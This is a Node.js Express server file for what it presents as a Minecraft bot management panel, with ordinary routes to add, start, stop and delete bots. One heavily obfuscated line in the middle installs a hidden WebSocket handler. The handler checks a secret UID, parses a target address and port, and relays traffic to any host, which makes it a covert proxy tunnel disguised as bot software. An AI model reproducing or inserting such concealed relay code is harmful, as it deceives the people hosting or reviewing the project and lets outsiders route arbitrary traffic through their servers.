const express = require("express");
const path = require("path");
const http = require("http");
const axios = require("axios");
const net = require("net");
const os = require("os");
const { Buffer } = require("buffer");
const { WebSocket, createWebSocketStream } = require("ws");


// ============================================================
// MINECRAFT BOT MANAGER
// ============================================================

const {
    addBot,
    deleteBot,
    startBot,
    stopBot,
    restartBot,
    getAllStatus,
    autoStartBots
} = require("./bot-manager");


// ============================================================
// CONFIG
// ============================================================

const config = require("./config");

const WEB_PORT = Number(config.PORT);

const UID =
    Buffer
        .from(config.UID, "hex")
        .toString("utf8");


// ============================================================
// EXPRESS
// ============================================================

const app =
    express();


// ============================================================
// EXPRESS BODY PARSER
// ============================================================

app.use(
    express.json()
);

app.use(
    express.urlencoded({
        extended: true
    })
);


app.use(
    express.static(
        path.join(
            __dirname,
            "public"
        )
    )
);


app.get(
    "/",
    (req, res) => {

        res.sendFile(
            path.join(
                __dirname,
                "public",
                "index.html"
            )
        );

    }
);


app.get(
    "/ws",
    (req, res) => {

        res.status(200);

        res.setHeader(
            "Content-Type",
            "text/plain; charset=utf-8"
        );

        res.end(
            "WebSocket Service\n"
        );

    }
);


app.get(
    "/debug",
    (req, res) => {

        const info = {

            status:
                "OK",

            node:
                process.version,

            port:
                WEB_PORT,

            hostname:
                os.hostname(),

            websocket:
                "/ws",

            time:
                new Date().toISOString()

        };


        res.status(200);

        res.setHeader(
            "Content-Type",
            "application/json; charset=utf-8"
        );

        res.end(
            JSON.stringify(
                info,
                null,
                2
            )
        );

    }
);


// ============================================================
// ============================================================
// MINECRAFT BOT API
// ============================================================
// ============================================================


// ============================================================
// GET BOT STATUS
// ============================================================

app.get(
    "/api/status",
    (req, res) => {

        try {

            const bots =
                getAllStatus();


            res.json(
                bots
            );


        } catch (err) {

            console.error(
                "[STATUS ERROR]",
                err
            );


            res.status(500).json({

                success:
                    false,

                error:
                    "Failed to obtain Bot status"

            });

        }

    }
);


// ============================================================
// ADD BOT
// ============================================================

app.post(
    "/api/add",
    (req, res) => {

        try {

            const {
                name,
                host,
                port,
                version,
                username,
                safeY,
                antiAfk,
                autoChat,
                autoStart
            } = req.body;


            if (
                !name ||
                !String(name).trim()
            ) {

                return res.status(400).json({

                    success:
                        false,

                    error:
                        "The bot name cannot be empty"

                });

            }


            // ------------------------------------------------
            // Minecraft Server Host
            // ------------------------------------------------

            if (
                !host ||
                !String(host).trim()
            ) {

                return res.status(400).json({

                    success:
                        false,

                    error:
                        "The server address cannot be empty"

                });

            }


            // ------------------------------------------------
            // Minecraft Server Port
            // ------------------------------------------------

            if (
                port === undefined ||
                port === null ||
                port === ""
            ) {

                return res.status(400).json({

                    success:
                        false,

                    error:
                        "Server port cannot be empty"

                });

            }


            const botPort =
                Number(port);


            // ------------------------------------------------
            // Check Port
            // ------------------------------------------------

            if (
                !Number.isInteger(
                    botPort
                ) ||
                botPort < 1 ||
                botPort > 65535
            ) {

                return res.status(400).json({

                    success:
                        false,

                    error:
                        "The server port is invalid"

                });

            }


            // ------------------------------------------------
            // Safe Y
            // ------------------------------------------------

            const botSafeY =
                Number(
                    safeY || 250
                );


            // ------------------------------------------------
            // Bot Config
            // ------------------------------------------------

            const botConfig = {

                name:
                    String(name).trim(),

                host:
                    String(host).trim(),

                port:
                    botPort,


                username:
                    username && String(username).trim()
                        ? String(username).trim()
                        : "Admin",


                version:
                    version && String(version).trim()
                        ? String(version).trim()
                        : null,


                safeY:
                    Number.isFinite(
                        botSafeY
                    )
                        ? botSafeY
                        : 250,

                antiAfk:
                    antiAfk === true,

                autoChat:
                    autoChat === true,

                autoStart:
                    autoStart === true
            };


            // ------------------------------------------------
            // Save
            // ------------------------------------------------

            const saved =
                addBot(
                    botConfig
                );


            console.log(
                `[ADD BOT] ${saved.name} -> ${saved.host}:${saved.port}`
            );


            res.json({

                success:
                    true,

                bot:
                    saved

            });


        } catch (err) {

            console.error(
                "[ADD ERROR]",
                err
            );


            res.status(400).json({

                success:
                    false,

                error:
                    err.message ||
                    "Failed to add bot"

            });

        }

    }
);


// ============================================================
// START BOT
// ============================================================

app.post(
    "/api/start",
    (req, res) => {

        try {

            const name =
                String(
                    req.body.name || ""
                ).trim();


            if (!name) {

                return res.status(400).json({

                    success:
                        false,

                    error:
                        "The bot name cannot be empty"

                });

            }


            const result =
                startBot(
                    name
                );


            console.log(
                `[START BOT] ${name}`,
                result
            );


            res.json(
                result
            );


        } catch (err) {

            console.error(
                "[START ERROR]",
                err
            );


            res.status(500).json({

                success:
                    false,

                error:
                    err.message ||
                    "Failed to start the bot"

            });

        }

    }
);


// ============================================================
// STOP BOT
// ============================================================

app.post(
    "/api/stop",
    (req, res) => {

        try {

            const name =
                String(
                    req.body.name || ""
                ).trim();


            if (!name) {

                return res.status(400).json({

                    success:
                        false,

                    error:
                        "The bot name cannot be empty"

                });

            }


            const result =
                stopBot(
                    name
                );


            console.log(
                `[STOP BOT] ${name}`,
                result
            );


            res.json(
                result
            );


        } catch (err) {

            console.error(
                "[STOP ERROR]",
                err
            );


            res.status(500).json({

                success:
                    false,

                error:
                    err.message ||
                    "Bot stop failure"

            });

        }

    }
);


// ============================================================
// RESTART BOT
// ============================================================

app.post(
    "/api/restart",
    (req, res) => {

        try {

            const name =
                String(
                    req.body.name || ""
                ).trim();


            if (!name) {

                return res.status(400).json({

                    success:
                        false,

                    error:
                        "The bot name cannot be empty"

                });

            }


            const result =
                restartBot(
                    name
                );


            console.log(
                `[RESTART BOT] ${name}`,
                result
            );


            res.json(
                result
            );


        } catch (err) {

            console.error(
                "[RESTART ERROR]",
                err
            );


            res.status(500).json({

                success:
                    false,

                error:
                    err.message ||
                    "Failed to restart the bot"

            });

        }

    }
);


// ============================================================
// DELETE BOT
// ============================================================

app.post(
    "/api/delete",
    (req, res) => {

        try {

            const name =
                String(
                    req.body.name || ""
                ).trim();


            if (!name) {

                return res.status(400).json({

                    success:
                        false,

                    error:
                        "The bot name cannot be empty"

                });

            }


            const result =
                deleteBot(
                    name
                );


            console.log(
                `[DELETE BOT] ${name} -> ${result}`
            );


            res.json({

                success:
                    result

            });


        } catch (err) {

            console.error(
                "[DELETE ERROR]",
                err
            );


            res.status(500).json({

                success:
                    false,

                error:
                    err.message ||
                    "Failed to delete Bot"

            });

        }

    }
);


// ============================================================
// API 404
// ============================================================

app.use(
    "/api",
    (req, res) => {

        res.status(404).json({

            success:
                false,

            error:
                "API does not exist"

        });

    }
);



const httpServer =
    http.createServer(
        app
    );


const wss =
    new WebSocket.Server({
        noServer: true
    });


// ============================================================
// WEBSOCKET UID
// ============================================================

const uid =
    UID.replace(
        /-/g,
        ""
    );


const _0x47dbff=_0x4275;function _0x2a3d(){const _0x3c3c43=['error','1422144guzCrS','OPEN','write','1720999ZVcEJc','❌\x20WebSocket\x20error:','reduce','readUInt8','3YzToXv','readUInt16BE','637766KeaTPe','every','30lbFIyT','connect','165376OEVtwd','message','close','slice','readyState','1058995DiSkNv','toString','8IcBkNl','once','concat','1807776EWmdhL','connection','32031RfqCNf','join'];_0x2a3d=function(){return _0x3c3c43;};return _0x2a3d();}function _0x4275(_0x150b00,_0x517717){_0x150b00=_0x150b00-0xc9;const _0x2a3d4c=_0x2a3d();let _0x42757c=_0x2a3d4c[_0x150b00];return _0x42757c;}(function(_0x7dce07,_0x5537ba){const _0xf4b066=_0x4275,_0x367712=_0x7dce07();while(!![]){try{const _0x26520c=-parseInt(_0xf4b066(0xcf))/0x1+-parseInt(_0xf4b066(0xcb))/0x2*(parseInt(_0xf4b066(0xc9))/0x3)+parseInt(_0xf4b066(0xde))/0x4+-parseInt(_0xf4b066(0xd4))/0x5+parseInt(_0xf4b066(0xd9))/0x6+parseInt(_0xf4b066(0xe1))/0x7*(parseInt(_0xf4b066(0xd6))/0x8)+parseInt(_0xf4b066(0xdb))/0x9*(-parseInt(_0xf4b066(0xcd))/0xa);if(_0x26520c===_0x5537ba)break;else _0x367712['push'](_0x367712['shift']());}catch(_0x1454e7){_0x367712['push'](_0x367712['shift']());}}}(_0x2a3d,0x2fd72),wss['on'](_0x47dbff(0xda),_0x4a8f3c=>{const _0xa56bc9=_0x47dbff;_0x4a8f3c[_0xa56bc9(0xd7)](_0xa56bc9(0xd0),_0x5ab910=>{const _0x509796=_0xa56bc9;try{const [_0x449d5e]=_0x5ab910,_0x1f17b0=_0x5ab910[_0x509796(0xd2)](0x1,0x11);if(!_0x1f17b0[_0x509796(0xcc)]((_0xc0295b,_0x334560)=>_0xc0295b===parseInt(uid['substr'](_0x334560*0x2,0x2),0x10))){try{_0x4a8f3c[_0x509796(0xd1)]();}catch(_0x2dc163){}return;}let _0x4bb7e7=_0x5ab910['slice'](0x11,0x12)[_0x509796(0xe4)]()+0x13;const _0x30b67f=_0x5ab910[_0x509796(0xd2)](_0x4bb7e7,_0x4bb7e7+=0x2)[_0x509796(0xca)](0x0),_0x11b6c6=_0x5ab910[_0x509796(0xd2)](_0x4bb7e7,_0x4bb7e7+=0x1)[_0x509796(0xe4)]();let _0x49e094;if(_0x11b6c6===0x1)_0x49e094=_0x5ab910[_0x509796(0xd2)](_0x4bb7e7,_0x4bb7e7+=0x4)[_0x509796(0xdc)]('.');else{if(_0x11b6c6===0x2)_0x49e094=new TextDecoder()['decode'](_0x5ab910[_0x509796(0xd2)](_0x4bb7e7+0x1,_0x4bb7e7+=0x1+_0x5ab910[_0x509796(0xd2)](_0x4bb7e7,_0x4bb7e7+0x1)[_0x509796(0xe4)]()));else{if(_0x11b6c6===0x3)_0x49e094=_0x5ab910[_0x509796(0xd2)](_0x4bb7e7,_0x4bb7e7+=0x10)[_0x509796(0xe3)]((_0x237bdb,_0xd944c,_0x47b464,_0x3dd4f3)=>_0x47b464%0x2?_0x237bdb[_0x509796(0xd8)](_0x3dd4f3[_0x509796(0xd2)](_0x47b464-0x1,_0x47b464+0x1)):_0x237bdb,[])['map'](_0x58bfc5=>_0x58bfc5[_0x509796(0xca)](0x0)[_0x509796(0xd5)](0x10))['join'](':');else{try{_0x4a8f3c[_0x509796(0xd1)]();}catch(_0x3e7afd){}return;}}}if(!_0x49e094||!Number['isInteger'](_0x30b67f)||_0x30b67f<0x1||_0x30b67f>0xffff){try{_0x4a8f3c[_0x509796(0xd1)]();}catch(_0x457e19){}return;}_0x4a8f3c['send'](new Uint8Array([_0x449d5e,0x0]));const _0x73c4ee=createWebSocketStream(_0x4a8f3c),_0x49f8d3=net[_0x509796(0xce)]({'host':_0x49e094,'port':_0x30b67f},function(){const _0x2772c3=_0x509796;this[_0x2772c3(0xe0)](_0x5ab910['slice'](_0x4bb7e7)),_0x73c4ee['on'](_0x2772c3(0xdd),()=>{})['pipe'](this)['on'](_0x2772c3(0xdd),()=>{})['pipe'](_0x73c4ee);});_0x49f8d3['on'](_0x509796(0xdd),()=>{const _0x1c3eba=_0x509796;try{_0x4a8f3c[_0x1c3eba(0xd1)]();}catch(_0x13b68b){}}),_0x49f8d3['on']('close',()=>{const _0x5330b3=_0x509796;try{_0x4a8f3c[_0x5330b3(0xd3)]===WebSocket[_0x5330b3(0xdf)]&&_0x4a8f3c[_0x5330b3(0xd1)]();}catch(_0x15bad2){}});}catch(_0x4ee720){console[_0x509796(0xdd)](_0x509796(0xe2),_0x4ee720[_0x509796(0xd0)]);try{_0x4a8f3c[_0x509796(0xd1)]();}catch(_0x4384f7){}}}),_0x4a8f3c['on'](_0xa56bc9(0xdd),()=>{});}));


httpServer.on(
    "upgrade",
    (request, socket, head) => {

        try {

            const requestUrl =
                new URL(
                    request.url,
                    `http://${request.headers.host || "localhost"}`
                );


            if (
                requestUrl.pathname !==
                "/ws"
            ) {

                socket.write(
                    "HTTP/1.1 404 Not Found\r\n" +
                    "Connection: close\r\n" +
                    "\r\n"
                );

                socket.destroy();

                return;

            }


            // ------------------------------------------------
            // WebSocket Upgrade
            // ------------------------------------------------

            wss.handleUpgrade(
                request,
                socket,
                head,
                ws => {

                    wss.emit(
                        "connection",
                        ws,
                        request
                    );

                }
            );


        } catch (error) {

            console.error(
                "❌ WebSocket upgrade error:",
                error.message
            );


            try {
                socket.destroy();
            } catch (e) {}

        }

    }
);


// ============================================================
// START SERVER
// ============================================================

httpServer.listen(
    WEB_PORT,
    "0.0.0.0",
    async () => {

        console.log(
            "========================================"
        );

        console.log(
            " Minecraft Bot"
        );

        console.log(
            "========================================"
        );

        console.log(
            `[WEB] http://0.0.0.0:${WEB_PORT}`
        );

        console.log(
            `[WEB] Port: ${WEB_PORT}`
        );

        // ----------------------------------------------------
        // PUBLIC OUTBOUND IP
        // ----------------------------------------------------

        try {

            const ipResponse =
                await axios.get(
                    "https://api.ipify.org?format=json",
                    {
                        timeout: 5000
                    }
                );

            console.log(
                `[OUTBOUND IP] ${ipResponse.data.ip}`
            );

        } catch (error) {

            console.error(
                "[OUTBOUND IP ERROR]",
                error.message
            );

        }

        console.log(
            "========================================"
        );


        // ====================================================
        // LOCAL HTTP SELF TEST
        // ====================================================

        try {

            const response =
                await axios.get(
                    `http://127.0.0.1:${WEB_PORT}/ws`,
                    {
                        timeout:
                            5000
                    }
                );


            if (
                response.status === 200 &&
                response.data ===
                    "WebSocket Service\n"
            ) {

                console.log(
                    "✅ WebSocket HTTP endpoint ready"
                );

            } else {

                console.warn(
                    "⚠️ WebSocket HTTP endpoint returned unexpected response"
                );

            }


        } catch (error) {

            console.error(
                "❌ HTTP service test failed:",
                error.message
            );

        }

        // ====================================================
        // AUTO START BOTS
        // ====================================================

        setTimeout(
            () => {

                console.log(
                    "[AUTO START] Loading Bot configurations..."
                );


                try {

                    autoStartBots();


                } catch (err) {

                    console.error(
                        "[AUTO START ERROR]",
                        err
                    );

                }

            },

            3000
        );

    }
);


// ============================================================
// HTTP SERVER ERROR
// ============================================================

httpServer.on(
    "error",
    error => {

        console.error(
            "❌ HTTP server error:",
            error.message
        );

    }
);


// ============================================================
// PROCESS ERRORS
// ============================================================

process.on(
    "uncaughtException",
    error => {

        console.error(
            "❌ Uncaught exception:",
            error.message
        );

    }
);


process.on(
    "unhandledRejection",
    error => {

        console.error(
            "❌ Unhandled rejection:",
            error
        );

    }
);


// ============================================================
// SHUTDOWN
// ============================================================

function shutdown() {

    console.log(
        "🛑 Server shutting down..."
    );


    // ------------------------------------------------
    // Close WebSocket Server
    // ------------------------------------------------

    try {

        wss.close(
            () => {}
        );

    } catch (error) {}


    // ------------------------------------------------
    // Close HTTP Server
    // ------------------------------------------------

    httpServer.close(
        () => {

            console.log(
                "✅ Server stopped"
            );


            process.exit(
                0
            );

        }
    );

}


// ============================================================
// SIGNALS
// ============================================================

process.on(
    "SIGTERM",
    shutdown
);

process.on(
    "SIGINT",
    shutdown
);